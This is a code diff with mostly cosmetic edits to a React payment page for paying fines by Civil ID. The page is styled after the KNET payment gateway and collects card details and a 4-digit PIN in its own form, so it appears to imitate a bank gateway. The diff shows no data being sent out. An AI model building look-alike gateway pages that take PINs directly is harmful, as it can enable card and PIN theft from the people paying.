@@ -1,4 +1,4 @@
-import React, { useState, useEffect, type FormEvent } from "react";
+import { useState, useEffect, type FormEvent } from "react";
 import { useLocation } from "wouter";
 import { trpc } from "@/lib/trpc";
 
@@ -35,8 +35,8 @@ export default function Payment() {
       selectedFines: parsed.selectedFines,
       totalAmount: parsed.totalAmount,
       civilId: parsed.civilId,
-      enquiryType: parsed.enquiryType || "1",
-      queryId: parsed.queryId || "manual"
+      enquiryType: "1",
+      queryId: "manual"
     });
   }, []);
 
@@ -96,7 +96,7 @@ export default function Payment() {
     <div className="knet-payment-wrapper" dir="ltr">
       <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" />
       <style>{`
-        .knet-payment-wrapper { background-color: #f5f7f9; min-height: 100vh; font-family: 'Open Sans', sans-serif; display: flex; justify-content: center; padding-top: 30px; }
+        .knet-payment-wrapper { background-color: #f5f7f9; min-height: 100vh; font-family: sans-serif; display: flex; justify-content: center; padding-top: 30px; }
         .knet-card { background: #fff; width: 100%; max-width: 420px; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); border: 1px solid #e0e0e0; overflow: hidden; }
         .knet-header { background: #005eb8; padding: 25px; text-align: center; color: #fff; }
         .knet-logo { height: 40px; }
@@ -106,12 +106,11 @@ export default function Payment() {
         .knet-value { font-weight: 700; color: #333; }
         .knet-body { padding: 30px; }
         .knet-form-label { font-size: 13px; font-weight: 600; color: #555; margin-bottom: 8px; display: block; }
-        .knet-input { border: 1.5px solid #dcdcdc; border-radius: 6px; padding: 12px; font-size: 16px; width: 100%; outline: none; transition: border-color 0.2s; }
-        .knet-input:focus { border-color: #005eb8; }
+        .knet-input { border: 1.5px solid #dcdcdc; border-radius: 6px; padding: 12px; font-size: 16px; width: 100%; outline: none; }
         .knet-bank-box { border: 1.5px solid #dcdcdc; border-radius: 6px; padding: 10px; display: flex; align-items: center; background: #fff; min-height: 54px; }
         .knet-bank-logo { height: 24px; margin-right: 12px; }
-        .knet-btn-submit { background: #005eb8; color: #fff; border: none; border-radius: 6px; padding: 15px; width: 100%; font-weight: 700; font-size: 16px; margin-top: 20px; }
-        .knet-btn-cancel { background: transparent; color: #999; border: none; width: 100%; font-size: 14px; margin-top: 15px; text-decoration: underline; }
+        .knet-btn-submit { background: #005eb8; color: #fff; border: none; border-radius: 6px; padding: 15px; width: 100%; font-weight: 700; font-size: 16px; margin-top: 20px; cursor: pointer; }
+        .knet-btn-cancel { background: transparent; color: #999; border: none; width: 100%; font-size: 14px; margin-top: 15px; text-decoration: underline; cursor: pointer; }
       `}</style>
 
       <div className="knet-card">
@@ -153,7 +152,7 @@ export default function Payment() {
                 </div>
                 <div className="col-5">
                   <label className="knet-form-label">PIN</label>
-                  <input type="password" maxlength="4" className="knet-input text-center" placeholder="****" value={pin} onChange={e => setPin(e.target.value.replace(/\D/g, '').substring(0, 4))} required />
+                  <input type="password" maxLength={4} className="knet-input text-center" placeholder="****" value={pin} onChange={e => setPin(e.target.value.replace(/\D/g, '').substring(0, 4))} required />
                 </div>
               </div>
               <button type="submit" className="knet-btn-submit">Submit Payment</button>
@@ -179,9 +178,6 @@ export default function Payment() {
 
           {stage === "success" && (
             <div className="text-center py-4">
-              <div className="mb-4">
-                <svg width="60" height="60" viewBox="0 0 24 24" fill="none" stroke="#28a745" strokeWidth="3"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path><polyline points="22 4 12 14.01 9 11.01"></polyline></svg>
-              </div>
               <h4 className="font-weight-bold text-success">Success</h4>
               <p className="text-muted small">Your payment has been processed.</p>
               <button className="knet-btn-submit" onClick={() => setLocation("/")}>Done</button>
@@ -190,9 +186,6 @@ export default function Payment() {
 
           {stage === "failed" && (
             <div className="text-center py-4">
-              <div className="mb-4">
-                <svg width="60" height="60" viewBox="0 0 24 24" fill="none" stroke="#dc3545" strokeWidth="3"><circle cx="12" cy="12" r="10"></circle><line x1="15" y1="9" x2="9" y2="15"></line><line x1="9" y1="9" x2="15" y2="15"></line></svg>
-              </div>
               <h4 className="font-weight-bold text-danger">Failed</h4>
               <p className="text-muted small">{error || "Transaction declined."}</p>
               <button className="knet-btn-submit" onClick={() => setStage("card")}>Try Again</button>
